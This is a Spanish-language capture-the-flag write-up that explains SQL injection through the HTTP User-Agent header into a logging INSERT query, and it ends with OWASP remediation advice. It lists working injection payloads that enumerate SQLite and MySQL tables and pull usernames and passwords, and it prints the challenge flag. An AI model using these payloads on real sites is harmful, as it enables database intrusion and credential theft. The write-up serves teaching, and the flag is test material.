# Reto: Dominic Logs (SQL Injection via HTTP Headers)

## 1. Enunciado y Análisis
Dominic creó un sitio web y agregó una sección oculta en `/logs` para registrar los dispositivos que visitan su página. Nos preguntan: "¿Tendrá algún usuario administrador?".

**Vectores clave identificados:**
1. La aplicación lee el dispositivo del usuario. A nivel web, esto significa que lee la cabecera HTTP `User-Agent`.
2. Esa información se almacena y se puede visualizar en la ruta `/logs`.
3. El objetivo es encontrar las credenciales de un posible usuario "administrador".

## 2. Modelado de Amenazas y Causa Raíz
Esta vulnerabilidad es un clásico **SQL Injection (SQLi) a través de cabeceras HTTP**.
Normalmente, los desarrolladores desconfían de los datos enviados a través de formularios (POST) o de la URL (GET), pero olvidan que las cabeceras HTTP (`User-Agent`, `Referer`, `X-Forwarded-For`) también son datos suministrados por el cliente y pueden ser manipulados libremente.

### La Causa Raíz (Código Vulnerable)
En el backend, probablemente haya una consulta SQL que inserta la visita sin parametrizar. Ejemplo conceptual:
```sql
INSERT INTO logs (ip, user_agent, time) VALUES ('192.168.1.1', 'Mozilla/5.0...', '12:00');
```
Si la aplicación no sanea el valor de `user_agent`, un atacante puede inyectar código SQL para alterar la estructura de la consulta `INSERT` o extraer datos de otras tablas. Dado que los resultados se pueden visualizar en `/logs`, estamos ante un escenario donde la exfiltración de datos será directa.

## 3. Resolución Técnica (PoC)

El objetivo es manipular nuestra cabecera `User-Agent` para que, al momento de hacer el `INSERT`, inyectemos una subconsulta (`SELECT`) que extraiga la contraseña del administrador.

### Paso 1: Entender el contexto de inyección
Si la consulta es:
`INSERT INTO logs (ip, user_agent, date) VALUES ('...', '$USER_AGENT', '...')`
Nuestro payload debe cerrar la cadena del User-Agent, inyectar el dato en la siguiente columna (si conocemos cuántas hay) y comentar el resto de la consulta.

Por ejemplo, si inyectamos como User-Agent:
`Test', (SELECT sqlite_version()))-- -`
La consulta se convierte en:
`... VALUES ('127.0.0.1', 'Test', (SELECT sqlite_version()))-- -', 'date')`
*(Esto insertaría la versión de la base de datos en la columna `date` o causaría un error si los tipos no coinciden).*

### Paso 2: Enumerar la base de datos
Para automatizar y probar payloads, puedes usar `curl` desde tu terminal o herramientas como Burp Suite.

**Payload 1: Verificar inyección y ver versión (Si es SQLite)**
Modifica tu cabecera User-Agent por algo como:
`', (SELECT sqlite_version()))-- -`
O tal vez concatenar el resultado en la misma columna del User-Agent:
`Test' || (SELECT sqlite_version()) || '`

**Payload 2: Extraer tablas**
Si descubres que es SQLite:
`Test' || (SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0) || '`
Si es MySQL:
`Test' || (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) || '`

**Payload 3: Extraer credenciales**
Una vez que sabemos que la tabla se llama `users`, podemos ver su estructura (columnas) inyectando:
`Hacker' || (SELECT sql FROM sqlite_master WHERE tbl_name='users') || '`

Finalmente, sabiendo las columnas (por ejemplo `username` y `password`), extraemos el santo grial:
`Hacker' || (SELECT username || ':' || password FROM users LIMIT 1) || '`

### Paso 3: Revisar los resultados
Después de enviar cada petición modificada, navega a la ruta `/logs` para leer qué es lo que la base de datos almacenó en lugar de tu User-Agent normal. Ahí verás los datos exfiltrados.

**Flag Obtenida:**
```text
7c16e2dead8630673e7b1cb8570fe32a
```

## 4. Remediación y Buenas Prácticas (OWASP)
1. **Validar y Sanitizar todo el Input:** La regla de oro es que **todo** lo que provenga del cliente (incluyendo las cabeceras HTTP como el User-Agent) es inherentemente no confiable.
2. **Consultas Parametrizadas (Prepared Statements):** Es la solución definitiva contra el SQLi. En lugar de concatenar cadenas, se deben usar parámetros (`?` o nombres bindeados) provistos por el ORM o el driver de base de datos.
   ```python
   # Ejemplo Seguro (Python SQLite)
   cursor.execute("INSERT INTO logs (ip, user_agent, time) VALUES (?, ?, ?)", (ip, user_agent, time))
   ```
3. **Mapeo de Tipos Estrictos:** Si un campo espera una fecha, debe validarse como tal en el backend antes de llegar a la base de datos.
